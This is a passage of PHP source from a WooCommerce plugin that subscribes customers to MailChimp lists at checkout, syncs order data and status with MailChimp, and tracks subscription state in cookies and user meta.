            // Make sure "on payment" option works in any case
            if (!empty($subscribe_on_payment) && self::order_is_paid($order_id) === false) {
                $this->log_add(__('Subscription on payment active, but order is not paid, stopping.', 'woochimp'));
                return;
            }

            foreach (array('auto', 'checkbox') as $sets_type) {
                if ($subscribe_on_completed == $sets_type || $subscribe_on_payment == $sets_type) {
                    $this->subscribe_checkout($order_id, $sets_type);
                }
            }

            // Check if we need to send order data or was it already sent
            if (!$this->opt['woochimp_send_order_data'] || self::order_data_sent($order_id)) {
                $this->log_add(__('Ecommerce data sending deactivated or data was already sent, stopping.', 'woochimp'));
                return;
            }

            try {
                // Get order args
                $args = $this->prepare_order_data($order_id);

                // Check those
                if ($args === false) {
                    throw new Exception(__('Unable to proceed - order args was not created.', 'woochimp'));
                }

                // Check if order exists in MailChimp
                if ($this->order_exists($args['store_id'], $args['id']) === true) {
                    $this->log_add(sprintf(__('Order %s already exists in Store %s, stopping.', 'woochimp'), $args['id'], $args['store_id']));
                    return;
                }

                // Send order data
                $result = $this->mailchimp->create_order($args['store_id'], $args);
                RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sent', 1);

                // Add to log
                $this->log_add(__('Ecommerce data sent successfully.', 'woochimp'));
                $this->log_process_regular_data($args, $result);
            }
            catch (Exception $e) {

                $this->log_add(__('Ecommerce data wasn\'t sent.', 'woochimp'));

                // Check message
                if (preg_match('/.+campaign with the provided ID does not exist in the account for this list+/', $e->getMessage())) {

                    // Remove campaign id from args
                    unset($args['campaign_id']);

                    // Try to send order data again
                    try {
                        $result = $this->mailchimp->create_order($args['store_id'], $args);
                        RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sent', 1);

                        // Add to log
                        $this->log_add(__('Ecommerce data sent successfully, but campaign id was omitted.', 'woochimp'));
                        $this->log_process_regular_data($args, $result);
                    }
                    catch (Exception $ex) {
                        $this->log_add(__('Ecommerce data wasn\'t sent even after omitting campaign id.', 'woochimp'));
                        $this->log_process_exception($ex);
                        return;
                    }
                }
                else {
                    $this->log_process_exception($e);
                }

                return;
            }
        }
    }

    /**
     * E-Commerce - maybe update status of order in Mailchimp
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function on_status_update($order_id, $old_status = '', $new_status = '')
    {
        // Check if it's enabled
        if (!$this->opt['woochimp_update_order_status'] || empty($order_id)) {
            return;
        }

        $this->log_add(__('Order status update process launched for order id: ', 'woochimp') . $order_id);

        // Try to get order object
        $order = wc_get_order($order_id);

        // Stop if there's no order and no status
        if (!$order && empty($new_status)) {
            $this->log_add(__('No order and no status found, stopping.', 'woochimp'));
            return;
        }

        // Check status
        $new_status = empty($new_status) ? $order->get_status() : $new_status;

        // Get MC store id
        try {
            $store_id = $this->ecomm_get_store();

            if ($store_id === false) {
                return;
            }
        }
        catch (Exception $e) {
            return;
        }

        // Get MC order id
        $mc_order_id = self::ecomm_get_id('order', $order_id);

        // Prepare order args to send
        $args = array(
            'financial_status'     => $new_status,
            'processed_at_foreign' => WooChimp::get_order_date_string($order),
            'updated_at_foreign'   => WooChimp::get_order_modified_date_string($order),
        );

        // Check if MailChimp is loaded
        if ($this->load_mailchimp()) {

            // Check if order exists in MailChimp
            if ($this->order_exists($store_id, $mc_order_id) === false) {
                $this->log_add(sprintf(__('Order %s does not exist in Store %s, stopping.', 'woochimp'), $mc_order_id, $store_id));
                return;
            }

            // Send request to update order
            try {
                $result = $this->mailchimp->update_order($store_id, $mc_order_id, $args);
                $this->log_add(__('Order updated successfully.', 'woochimp'));
                $this->log_process_regular_data($args, $result);
            }
            catch (Exception $e) {
                $this->log_process_exception($e);
                return;
            }
        }
    }

    /**
     * E-Commerce - maybe remove order from Mailchimp
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function on_cancel($order_id)
    {
        // Check if it's enabled
        if (!$this->opt['woochimp_delete_order_data'] || empty($order_id)) {
            return;
        }

        $this->log_add(__('Order cancel process launched for order id: ', 'woochimp') . $order_id);

        // Get store id
        try {
            $store_id = $this->ecomm_get_store();

            if ($store_id === false) {
                return;
            }
        }
        catch (Exception $e) {
            return;
        }

        $mc_order_id = self::ecomm_get_id('order', $order_id);

        // Check if MailChimp is loaded
        if ($this->load_mailchimp()) {

            // Check if order exists in MailChimp
            if ($this->order_exists($store_id, $mc_order_id) === false) {
                $this->log_add(sprintf(__('Order %s does not exist in Store %s, stopping.', 'woochimp'), $mc_order_id, $store_id));
                return;
            }

            // Send request to delete order
            try {
                $this->mailchimp->delete_order($store_id, $mc_order_id);
                $this->log_add(__('Order deleted successfully.', 'woochimp'));
            }
            catch (Exception $e) {
                $this->log_process_exception($e);
                return;
            }
        }
    }

    /**
     * Check if user was already subscribed from this order
     *
     * @access public
     * @param int $order_id
     * @param string $sets_type
     * @return bool
     */
    public static function already_subscribed_from_order($order_id, $sets_type)
    {
        $woochimp_subscribed_auto = RightPress_WC::order_get_meta($order_id, '_woochimp_subscribed_auto', true);
        $woochimp_subscribed_checkbox = RightPress_WC::order_get_meta($order_id, '_woochimp_subscribed_checkbox', true);

        if (($sets_type == 'auto' && !empty($woochimp_subscribed_auto)) || ($sets_type == 'checkbox' && !empty($woochimp_subscribed_checkbox))) {
            return true;
        }

        return false;
    }

    /**
     * Check if new order was already processed
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function new_order_processed($order_id)
    {
        $woochimp_new_order = RightPress_WC::order_get_meta($order_id, '_woochimp_new_order', true);
        return !empty($woochimp_new_order);
    }

    /**
     * Check if order was already sent to MC
     *
     * @access public
     * @param int $order_id
     * @return bool
     */
    public static function order_data_sent($order_id)
    {
        $woochimp_ecomm_sent = RightPress_WC::order_get_meta($order_id, '_woochimp_ecomm_sent', true);
        return !empty($woochimp_ecomm_sent);
    }

    /**
     * Check if checkout auto-subscribe option is enabled
     *
     * @access public
     * @return bool
     */
    public function checkout_auto_is_active()
    {
        return ($this->opt['woochimp_checkout_auto_subscribe_on'] == '4') ? false : true;
    }

    /**
     * Check if checkout checkbox subscribe option is enabled
     *
     * @access public
     * @return bool
     */
    public function checkout_checkbox_is_active()
    {
        return ($this->opt['woochimp_checkout_checkbox_subscribe_on'] == '4') ? false : true;
    }

    /**
     * Get user data on checkout
     *
     * @access public
     * @param int $order_id
     * @return bool
     */
    public function get_checkout_data($order_id)
    {
        // Check and save campaign variables
        foreach (array('woochimp_mc_cid', 'woochimp_mc_eid') as $mc_id) {

            // Copy from cookie directly
            if (isset($_COOKIE[$mc_id])) {
                RightPress_WC::order_add_meta_data($order_id, '_' . $mc_id, $_COOKIE[$mc_id], true);
            }

            // Or use a backup plan with hidden values
            else if (isset($_POST['woochimp_data'][$mc_id])) {
                RightPress_WC::order_add_meta_data($order_id, '_' . $mc_id, $_POST['woochimp_data'][$mc_id], true);
            }
        }

        // Save groups data posted on checkout
        if (isset($_POST['woochimp_data']['groups'])) {
            RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_groups', $_POST['woochimp_data']['groups'], true);
        }

        // Return user preference
        return isset($_POST['woochimp_data']['woochimp_user_preference']);
    }

    /**
     * New order created by admin
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function new_admin_order($order_id)
    {
        // Start process in log
        $this->log_add(__('New order created from the dashboard: ', 'woochimp') . $order_id);

        // Pass on to other method
        $this->new_order($order_id, true);
    }

    /**
     * New order actions
     *
     * @access public
     * @param int $order_id
     * @param bool $admin_order
     * @return void
     */
    public function new_order($order_id, $admin_order = false)
    {
        // Start process in log
        $this->log_add(__('New order process launched for order id: ', 'woochimp') . $order_id);

        // Get checkout data only for user orders
        if ($admin_order === false) {

            // Possibly run checkout data process and get user preference
            $user_preference = $this->get_checkout_data($order_id);
        }

        // Check if at least one checkout option is active
        if (!$this->opt['woochimp_enabled'] || (!$this->checkout_auto_is_active() && !$this->checkout_checkbox_is_active()) || self::new_order_processed($order_id)) {
            $this->log_add(__('Order already processed or something is deactivated in options, stopping.', 'woochimp'));
            return;
        }

        // Process auto-subscription
        if ($this->checkout_auto_is_active()) {

            // Subscribe on completed order
            if ($this->opt['woochimp_checkout_auto_subscribe_on'] == '2') {
                RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_completed', 'auto', true);
            }

            // Subscribe on payment received
            else if ($this->opt['woochimp_checkout_auto_subscribe_on'] == '3') {
                RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_payment', 'auto', true);
            }

            // Subscribe on order placed
            else {

                // On admin dashboard - subscribe now
                if ($admin_order) {
                    $this->subscribe_checkout($order_id, 'auto');
                }

                // Otherwise postpone for later
                else {
                    RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_placed', 'auto', true);
                }
            }
        }

        // Process subscription on checkbox
        if ($this->checkout_checkbox_is_active() && $admin_order === false) {

            // Check if user was already subscribed
            $already_subscribed = ($this->can_user_subscribe_with_checkbox() === false) ? true : false;

            // Check if user preference was set
            if ($user_preference === false) {

                // If user was subscribed, need to unsubscribe him if checkbox was displayed
                if ($already_subscribed && $this->opt['woochimp_hide_checkbox'] != '1') {
                    $this->log_add(__('User unchecked preference checkbox - unsubscribing...', 'woochimp'));
                    $this->unsubscribe_checkout($order_id, 'checkbox');
                }

                $this->log_add(__('User haven\'t checked preference checkbox, stopping.', 'woochimp'));
                return;
            }

            // Subscribe on completed order
            if ($this->opt['woochimp_checkout_checkbox_subscribe_on'] == '2') {
                RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_completed', 'checkbox', true);
            }

            // Subscribe on payment received
            else if ($this->opt['woochimp_checkout_checkbox_subscribe_on'] == '3') {
                RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_payment', 'checkbox', true);
            }

            // Subscribe on order placed
            else {
                RightPress_WC::order_add_meta_data($order_id, 'woochimp_subscribe_on_placed', 'checkbox', true);
            }
        }

        // Mark this order as processed
        RightPress_WC::order_update_meta_data($order_id, '_woochimp_new_order', 1);
    }

    /**
     * Subscribe user on checkout or order completed
     *
     * @access public
     * @param int $order_id
     * @param string $sets_type
     * @return void
     */
    public function subscribe_checkout($order_id, $sets_type)
    {
        $this->log_add(sprintf(__('Subscription process launched for order id %s and sets type %s ', 'woochimp'), $order_id, $sets_type));

        if (class_exists('Subscriptio_Order_Handler') && method_exists('Subscriptio_Order_Handler', 'order_is_renewal') && Subscriptio_Order_Handler::order_is_renewal($order_id)) {
            $this->log_add(__('Order is subscription renewal order, stopping.', 'woochimp'));
            return;
        }

        $order = wc_get_order($order_id);

        if (!$order) {
            $this->log_add(__('Order is not found, stopping.', 'woochimp'));
            return;
        }

        // Get user id
        $user_id = $order->get_user_id();

        if (!is_admin() && $user_id == 0) {
            $user_id = is_user_logged_in() ? get_current_user_id() : 0;
        }

        // Get user meta
        // WC31: Review all calls to user_meta just in case WC moves from default WP user storage to some custom storage
        $user_meta = get_user_meta($user_id);

        // Get user email
        $email = $order->get_billing_email();

        if (empty($email)) {
            $this->log_add(__('Email is not found, stopping.', 'woochimp'));
            return;
        }

        // Check if user was subscribed earlier (using this sets type)
        if (self::already_subscribed_from_order($order_id, $sets_type)) {
            $this->log_add(__('User already subscribed from this order, stopping.', 'woochimp'));
            return;
        }

        $sets_field = 'sets_' . $sets_type;

        // Subscribe to lists that match criteria
        if (isset($this->opt[$sets_field]) && is_array($this->opt[$sets_field])) {
            foreach ($this->opt[$sets_field] as $set) {

                // Check conditions
                $proceed_subscription = $this->conditions_check($set, $sets_type, $order, $user_meta, $user_id);

                // So, should we proceed with this set?
                if ($proceed_subscription) {

                    // Get posted groups (only for checkbox)
                    $posted_groups = RightPress_WC::order_get_meta($order_id, 'woochimp_subscribe_groups', true);

                    if (!empty($posted_groups) && $sets_type == 'checkbox') {

                        $posted_groups_list = array();

                        foreach ($posted_groups as $grouping_key => $groups) {
                            if (is_array($groups)) {
                                foreach ($groups as $group) {
                                    $posted_groups_list[] = $group;
                                }
                            }
                            else {
                                $posted_groups_list[] = $groups;
                            }
                        }

                        $subscribe_groups = array_intersect($posted_groups_list, $set['groups']);
                    }
                    else {
                        $subscribe_groups = $set['groups'];
                    }

                    // Get double opt-in option
                    $double_optin = (bool) $this->opt['woochimp_double_checkout_' . $sets_type];

                    // Get custom fields
                    $custom_fields = array();

                    foreach ($set['fields'] as $custom_field) {
                        if (preg_match('/^order_user_id/', $custom_field['name'])) {
                            $custom_fields[$custom_field['tag']] = $user_id;
                        }
                        else if (preg_match('/^order_date_created/', $custom_field['name'])) {
                            $date_created = $order->get_date_created();
                            $format = apply_filters('woochimp_date_format', get_option('date_format'));
                            $custom_fields[$custom_field['tag']] = $date_created->format($format);
                        }
                        else if (preg_match('/^order_shipping_method_title/', $custom_field['name'])) {
                            foreach ($order->get_shipping_methods() as $shipping_method) {
                                $custom_fields[$custom_field['tag']] = $shipping_method->get_method_title();
                                break;
                            }
                        }
                        else if (preg_match('/^order_/', $custom_field['name'])) {

                            $real_field_key = preg_replace('/^order_/', '', $custom_field['name']);

                            // Maybe replace country/state code
                            if (preg_match('/_state$|_country$/', $real_field_key)) {
                                $value = $this->maybe_replace_location_code($real_field_key, $order);
                            }
                            else {
                                $method_name = 'get_' . $real_field_key;
                                $value = $order->$method_name();
                            }

                            $custom_fields[$custom_field['tag']] = $value;
                        }
                        else if (preg_match('/^user_/', $custom_field['name'])) {
                            $real_field_key = preg_replace('/^user_/', '', $custom_field['name']);
                            if (isset($user_meta[$real_field_key])) {
                                $custom_fields[$custom_field['tag']] = $user_meta[$real_field_key][0];
                            }
                        }
                        else if ($custom_field['name'] == 'custom_order_field') {
                            $custom_order_field = RightPress_WC::order_get_meta($order_id, $custom_field['value'], true);
                            $custom_order_field = !empty($custom_order_field) ? $custom_order_field : '';
                            $custom_fields[$custom_field['tag']] = $custom_order_field;
                        }
                        else if ($custom_field['name'] == 'custom_user_field') {
                            if ($user_id > 0) {
                                $custom_user_field = get_user_meta($user_id, $custom_field['value'], true);
                                $custom_user_field = !empty($custom_user_field) ? $custom_user_field : '';
                                $custom_fields[$custom_field['tag']] = $custom_user_field;
                            }
                        }
                        else if ($custom_field['name'] == 'static_value') {
                            $custom_fields[$custom_field['tag']] = $custom_field['value'];
                        }

                    }

                    if ($this->subscribe($set['list'], $email, $subscribe_groups, $custom_fields, $user_id, $double_optin) !== false) {
                        RightPress_WC::order_update_meta_data($order_id, '_woochimp_subscribed_' . $sets_type, 1);
                    }
                }

            }
        }
    }

    /**
     * Unsubscribe user on checkout
     *
     * @access public
     * @param int $order_id
     * @param string $sets_type
     * @return void
     */
    public function unsubscribe_checkout($order_id, $sets_type)
    {
        $order = wc_get_order($order_id);

        if (!$order) {
            return;
        }

        // Get user id
        $user_id = $order->get_user_id();

        if (!is_admin() && $user_id == 0) {
            $user_id = is_user_logged_in() ? get_current_user_id() : 0;
        }

        // Get user email
        $email = $order->get_billing_email();

        if (empty($email)) {
            return;
        }

        $sets_field = 'sets_' . $sets_type;

        // Unsubscribe lists
        if (isset($this->opt[$sets_field]) && is_array($this->opt[$sets_field])) {

            foreach ($this->opt[$sets_field] as $set) {

                if ($this->unsubscribe($set['list'], $email) !== false) {
                    self::remove_user_list($set['list'], 'subscribed', $user_id);
                    self::track_user_list($set['list'], 'unsubscribed', $email, array(), $user_id);
                }
            }
        }
    }

    /**
     * Check conditions of set
     *
     * @access public
     * @param array $set
     * @param string $sets_type
     * @param obj $order
     * @param array $user_meta
     * @param int $user_id
     * @param bool $is_cart
     * @return bool
     */
    public function conditions_check($set, $sets_type, $order, $user_meta, $user_id, $is_cart = false)
    {
        // Check if there's no "do not resubscribe" flag
        $do_not_resubscribe = false;
        if ($sets_type == 'auto' && $this->opt['woochimp_do_not_resubscribe_auto']) {
            $do_not_resubscribe = true;
        }

        if ($do_not_resubscribe) {

            $unsubscribed_lists_full = self::read_user_lists('unsubscribed', $user_id);
            $unsubscribed_lists = array_keys($unsubscribed_lists_full);

            foreach ($unsubscribed_lists as $unsub_list) {
                if ($unsub_list == $set['list']) {
                    return false;
                }
            }
        }

        $proceed = false;

        // Check the order and try to get data
        if (is_object($order)) {
            $items = $order->get_items();
            $total = $order->get_total();
            $items_are_order_items = true;
        }

        // Maybe get items and totals from cart instead of order
        if ($is_cart || empty($items)) {
            global $woocommerce;
            $items = $woocommerce->cart->cart_contents;
            $total = $woocommerce->cart->total;
            $items_are_order_items = false;
        }

        // Always
        if ($set['condition']['key'] == 'always') {
            $proceed = true;
        }

        // Products
        else if ($set['condition']['key'] == 'products') {
            if ($set['condition']['value']['operator'] == 'contains') {
                foreach ($items as $item) {

                    // Get order item product id
                    if ($items_are_order_items) {
                        $product = $item->get_product();
                        $product_id = $product->is_type('variation') ? $product->get_parent_id() : $product->get_id();
                    }
                    else {
                        $product_id = $item['product_id'];
                    }

                    if (in_array($product_id, $set['condition']['value']['value'])) {
                        $proceed = true;
                        break;
                    }
                }
            }
            else if ($set['condition']['value']['operator'] == 'does_not_contain') {
                $contains_item = false;

                foreach ($items as $item) {

                    // Get order item product id
                    if ($items_are_order_items) {
                        $product = $item->get_product();
                        $product_id = $product->is_type('variation') ? $product->get_parent_id() : $product->get_id();
                    }
                    else {
                        $product_id = $item['product_id'];
                    }

                    if (in_array($product_id, $set['condition']['value']['value'])) {
                        $contains_item = true;
                        break;
                    }
                }

                $proceed = !$contains_item;
            }
        }

        // Variations
        else if ($set['condition']['key'] == 'variations') {
            if ($set['condition']['value']['operator'] == 'contains') {

                foreach ($items as $item) {

                    // Get order item product id
                    if ($items_are_order_items) {
                        $product = $item->get_product();
                        $variation_id = $product->is_type('variation') ? $product->get_id() : '';
                    }
                    else {
                        $variation_id = $item['variation_id'];
                    }

                    if (in_array($variation_id, $set['condition']['value']['value'])) {
                        $proceed = true;
                        break;
                    }
                }
            }
            else if ($set['condition']['value']['operator'] == 'does_not_contain') {
                $contains_item = false;

                foreach ($items as $item) {

                    // Get order item product id
                    if ($items_are_order_items) {
                        $product = $item->get_product();
                        $variation_id = $product->is_type('variation') ? $product->get_id() : '';
                    }
                    else {
                        $variation_id = $item['variation_id'];
                    }

                    if (in_array($variation_id, $set['condition']['value']['value'])) {
                        $contains_item = true;
                        break;
                    }
                }

                $proceed = !$contains_item;
            }
        }

        // Categories
        else if ($set['condition']['key'] == 'categories') {

            $categories = array();

            foreach ($items as $item) {

                // Get order item product id
                if ($items_are_order_items) {
                    $product = $item->get_product();
                    $product_id = $product->is_type('variation') ? $product->get_parent_id() : $product->get_id();
                }
                else {
                    $product_id = $item['product_id'];
                }

                $item_categories = get_the_terms($product_id, 'product_cat');

                if (is_array($item_categories)) {
                    foreach ($item_categories as $item_category) {
                        $categories[] = $item_category->term_id;
                    }
                }
            }

            if ($set['condition']['value']['operator'] == 'contains') {
                foreach ($categories as $category) {
                    if (in_array($category, $set['condition']['value']['value'])) {
                        $proceed = true;
                        break;
                    }
                }
            }
            else if ($set['condition']['value']['operator'] == 'does_not_contain') {
                $contains_item = false;

                foreach ($categories as $category) {
                    if (in_array($category, $set['condition']['value']['value'])) {
                        $contains_item = true;
                        break;
                    }
                }

                $proceed = !$contains_item;
            }
        }

        // Amount
        else if ($set['condition']['key'] == 'amount') {
            if (($set['condition']['value']['operator'] == 'lt' && $total < $set['condition']['value']['value'])
             || ($set['condition']['value']['operator'] == 'le' && $total <= $set['condition']['value']['value'])
             || ($set['condition']['value']['operator'] == 'eq' && $total == $set['condition']['value']['value'])
             || ($set['condition']['value']['operator'] == 'ge' && $total >= $set['condition']['value']['value'])
             || ($set['condition']['value']['operator'] == 'gt' && $total > $set['condition']['value']['value'])) {
                $proceed = true;
            }
        }

        // Roles
        else if ($set['condition']['key'] == 'roles') {

            if ($user_id > 0) {

                // Get user data and roles
                $user_data = get_userdata($user_id);
                $user_roles = $user_data->roles;

                // Compare the arrays
                $compared_array = array_intersect($user_roles, $set['condition']['value']['value']);
            }
            else {
                $compared_array = array();
            }

            if (($set['condition']['value']['operator'] == 'is' && !empty($compared_array)) || ($set['condition']['value']['operator'] == 'is_not' && empty($compared_array))) {
                $proceed = true;
            }
        }

        // Custom field
        else if ($set['condition']['key'] == 'custom') {

            // Can't check custom values in cart
            if ($is_cart) {
                return true;
            }

            $custom_field_value = null;

            // Get the custom field value
            if (isset($order->order_custom_fields[$set['condition']['value']['key']])) {
                $custom_field_value = is_array($order->order_custom_fields[$set['condition']['value']['key']]) ? $order->order_custom_fields[$set['condition']['value']['key']][0] : $order->order_custom_fields[$set['condition']['value']['key']];
            }
            else if (isset($order->order_custom_fields['_'.$set['condition']['value']['key']])) {
                $custom_field_value = is_array($order->order_custom_fields['_'.$set['condition']['value']['key']]) ? $order->order_custom_fields['_'.$set['condition']['value']['key']][0] : $order->order_custom_fields['_'.$set['condition']['value']['key']];
            }

            // Get order id
            $order_id = $order->get_id();

            // Should we check in order post meta?
            if ($custom_field_value == null) {
                $order_meta = RightPress_WC::order_get_meta($order_id, $set['condition']['value']['key'], true);

                if ($order_meta == '') {
                    $order_meta = RightPress_WC::order_get_meta($order_id, '_'.$set['condition']['value']['key'], true);
                }

                if ($order_meta != '') {
                    $custom_field_value = is_array($order_meta) ? $order_meta[0] : $order_meta;
                }
            }

            // Should we check in $_POST data?
            if ($custom_field_value == null && isset($_POST[$set['condition']['value']['key']])) {
                $custom_field_value = $_POST[$set['condition']['value']['key']];
            }

            // Proceed?
            if ($custom_field_value != null) {
                if (($set['condition']['value']['operator'] == 'is' && $set['condition']['value']['value'] == $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'is_not' && $set['condition']['value']['value'] != $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'contains' && preg_match('/' . $set['condition']['value']['value'] . '/', $custom_field_value) === 1)
                 || ($set['condition']['value']['operator'] == 'does_not_contain' && preg_match('/' . $set['condition']['value']['value'] . '/', $custom_field_value) !== 1)
                 || ($set['condition']['value']['operator'] == 'lt' && $set['condition']['value']['value'] < $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'le' && $set['condition']['value']['value'] <= $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'eq' && $set['condition']['value']['value'] == $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'ge' && $set['condition']['value']['value'] >= $custom_field_value)
                 || ($set['condition']['value']['operator'] == 'gt' && $set['condition']['value']['value'] > $custom_field_value)) {
                    $proceed = true;
                }
            }
        }

        return $proceed;
    }

    /**
     * Subscribe user to mailing list
     *
     * @access public
     * @param string $list_id
     * @param string $email
     * @param array $groups
     * @param array $custom_fields
     * @param int $user_id
     * @return bool
     */
    public function subscribe($list_id, $email, $groups = array(), $custom_fields = array(), $user_id = 0, $double_optin = false)
    {
        // Load MailChimp
        if (!$this->load_mailchimp()) {
            return false;
        }

        $this->log_add(__('Subscribe process launched for user email: ', 'woochimp') . $email);

        $interests = array();
        $merge_fields = array();

        // Any groups to be set?
        if (!empty($groups)) {

            foreach ($groups as $group) {
                $parts = preg_split('/:/', htmlspecialchars_decode($group), 2);
                $interests[$parts[0]] = true;
            }
        }

        // Double opt-in option selects the status
        $user_status = $double_optin ? 'pending' : 'subscribed';

        // Custom fields
        foreach ($custom_fields as $key => $value) {
            if (!empty($value)) {
                $merge_fields[$key] = $value;
            }
        }

        $params = array(
            'email_address' => $email,
            'status'        => $user_status,
        );

        // Don't include empty non-required params
        if (!empty($interests)) {
            $params['interests'] = $interests;
        }

        if (!empty($merge_fields)) {
            $params['merge_fields'] = $merge_fields;
        }

        // Add only new users or also update old
        $update = $this->opt['woochimp_already_subscribed_action'] == '2' ? true : false;

        // Subscribe
        try {

            // Note: old "replace groups" options are replaced by this option
            $result = ($update === true) ? $this->mailchimp->put_member($list_id, $params) : $this->mailchimp->post_member($list_id, $params);

            // Add to log
            $this->log_add(__('User was subscribed successfully.', 'woochimp'));
            $this->log_process_regular_data($params, $result);

            // Record user's subscribed list
            self::track_user_list($list_id, 'subscribed', $email, array_keys($interests), $user_id);
            self::remove_user_list($list_id, 'unsubscribed', $user_id);

            return true;
        }
        catch (Exception $e) {

            if (preg_match('/.+is already a list member+/', $e->getMessage())) {
                $this->log_add(__('Member already exists.', 'woochimp'));
                return 'member_exists';
            }

            $this->log_process_exception($e);
            return false;
        }
    }

    /**
     * Unsubscribe user to mailing list
     *
     * @access public
     * @param string $list_id
     * @param string $email
     * @return bool
     */
    public function unsubscribe($list_id, $email)
    {
        // Load MailChimp
        if (!$this->load_mailchimp()) {
            return false;
        }

        $this->log_add(__('Unsubscribe process launched for user email: ', 'woochimp') . $email);

        try {
            $this->mailchimp->delete_member($list_id, $email);
            $this->log_add(__('Member deleted successfully.', 'woochimp'));
            return true;
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return false;
        }
    }

    /**
     * Convert two-letter country/state code to full name
     *
     * @access public
     * @param string $field_key
     * @param obj $order
     * @return void
     */
    public function maybe_replace_location_code($field_key, $order)
    {
        // Get countries object
        $wc_countries = new WC_Countries();
        $mc_countries = self::get_mc_countries_exceptions();

        // Get billing/shipping field type
        $field_type = preg_replace('/_state$|_country$/', '', $field_key);
        $country_code = ($field_type === 'shipping' ? $order->get_shipping_country() : $order->get_billing_country());

        // Maybe get state code
        if (preg_match('/_state$/', $field_key)) {
            $state_code = ($field_type === 'shipping' ? $order->get_shipping_state() : $order->get_billing_state());

            if (empty($state_code)) {
                return;
            }
        }

        if (isset($wc_countries->countries[$country_code])) {

            // Return state name if it's set
            if (isset($state_code)) {
                if (isset($wc_countries->states[$country_code])) {
                    return $wc_countries->states[$country_code][$state_code];
                }
                else {
                    return $state_code;
                }
            }

            // Maybe return MC's country name
            if (isset($mc_countries[$country_code]) && $wc_countries->countries[$country_code] != $mc_countries[$country_code]) {
                return $mc_countries[$country_code];
            }

            // Return country name
            return $wc_countries->countries[$country_code];
        }
    }

    /**
     * Track campaign
     *
     * @access public
     * @return void
     */
    public function track_campaign()
    {
        // Check if mc_cid is set
        if (isset($_GET['mc_cid'])) {
            setcookie('woochimp_mc_cid', $_GET['mc_cid'], time()+7776000, COOKIEPATH, COOKIE_DOMAIN);
        }

        // Check if mc_eid is set
        if (isset($_GET['mc_eid'])) {
            setcookie('woochimp_mc_eid', $_GET['mc_eid'], time()+7776000, COOKIEPATH, COOKIE_DOMAIN);
        }
    }

    /**
     * Track (un)subscribed list
     *
     * @access public
     * @param string $list_id
     * @param string $list_type
     * @param string $email
     * @param array $groups
     * @param int $user_id
     * @return void
     */
    public static function track_user_list($list_id, $list_type, $email, $groups = array(), $user_id = 0)
    {
        if (empty($list_id) || empty($email)) {
            return false;
        }

        // Set one timestamp for all operations
        $timestamp = time();

        // Check if data needs migration
        self::maybe_migrate_user_lists($list_id, $list_type, $timestamp, $email, $groups, $user_id);

        // Set new value
        $new_meta_value[$list_id] = array(
            'email'     => $email,
            'timestamp' => $timestamp,
            'groups'    => $groups,
        );

        // Maybe add user meta
        if ($user_id > 0) {
            self::update_woochimp_user_meta($user_id, 'woochimp_' . $list_type . '_lists', $new_meta_value);
        }

        // Set cookie
        self::update_user_list_cookie($list_id, $list_type, $timestamp, $email, $groups);
    }

    /**
     * Migrate user lists
     *
     * @access public
     * @param string $list_id
     * @param string $list_type
     * @param int $timestamp
     * @param string $email
     * @param array $groups
     * @param int $user_id
     * @return void
     */
    public static function maybe_migrate_user_lists($list_id, $list_type, $timestamp = '', $email = '', $groups = array(), $user_id = 0)
    {
        if (empty($list_id) || empty($list_type)) {
            return false;
        }

        if (empty($timestamp)) {
            $timestamp = time();
        }

        // Make sure unsubscribed lists has a priority
        $timestamp = ($list_type == 'subscribed') ? $timestamp - 10 : $timestamp;

        // Migrate logged in user meta - all lists
        if ($user_id > 0) {
            self::migrate_user_lists_meta($list_type, $timestamp, $user_id);
        }

        // Migrate cookies list data, if cookie has old format ('1')
        $cookie_value = isset($_COOKIE['woochimp_' . $list_type . '_list_' . $list_id]) ? $_COOKIE['woochimp_' . $list_type . '_list_' . $list_id] : '';

        if ($cookie_value == '1') {
            self::update_user_list_cookie($list_id, $list_type, $timestamp, $email, $groups);
        }
    }

    /**
     * Migrate user lists in meta
     *
     * @access public
     * @param string $list_type
     * @param int $timestamp
     * @param int $user_id
     * @return void
     */
    public static function migrate_user_lists_meta($list_type, $timestamp, $user_id)
    {
        // Maybe migrate old format
        if ($lists = get_user_meta($user_id, 'woochimp_' . $list_type . '_lists', true)) {

            $new_lists = array();

            foreach ($lists as $key => $list) {

                if (!is_array($list) && is_int($key)) {

                    $new_lists[$list] = array(
                        'timestamp' => $timestamp,
                        'email'     => '',
                        'groups'    => array(),
                    );
                }
            }

            // Update user meta
            if (!empty($new_lists)) {
                update_user_meta($user_id, 'woochimp_' . $list_type . '_lists', $new_lists);
            }
        }
    }

    /**
     * Update user list in cookies
     *
     * @access public
     * @param string $list_id
     * @param string $list_type
     * @param int $timestamp
     * @param string $email
     * @param array $groups
     * @return void
     */
    public static function update_user_list_cookie($list_id, $list_type, $timestamp = '', $email = '', $groups = array())
    {
        if (empty($timestamp)) {
            $timestamp = time();
        }

        // Check groups value
        $groups = (is_array($groups) && !empty($groups)) ? join('|', $groups) : '';

        // Set list-specific cookie
        $new_list_cookie_value = $timestamp . '|' . $email . '|' . $groups;
        setcookie('woochimp_' . $list_type . '_list_' . $list_id, $new_list_cookie_value, time()+31557600, COOKIEPATH, COOKIE_DOMAIN);
    }

    /**
     * Remove user list
     *
     * @access public
     * @param string $list_id
     * @param string $list_type
     * @param int $user_id
     * @return void
     */
    public static function remove_user_list($list_id, $list_type, $user_id = 0)
    {
        // Maybe remove list form meta
        if ($user_id > 0) {
            self::remove_user_list_from_meta($list_id, $list_type, $user_id);
        }

        // Try to remove list from cookies
        self::remove_user_list_from_cookies($list_id, $list_type);
    }

    /**
     * Remove user list from meta
     *
     * @access public
     * @param string $list_id
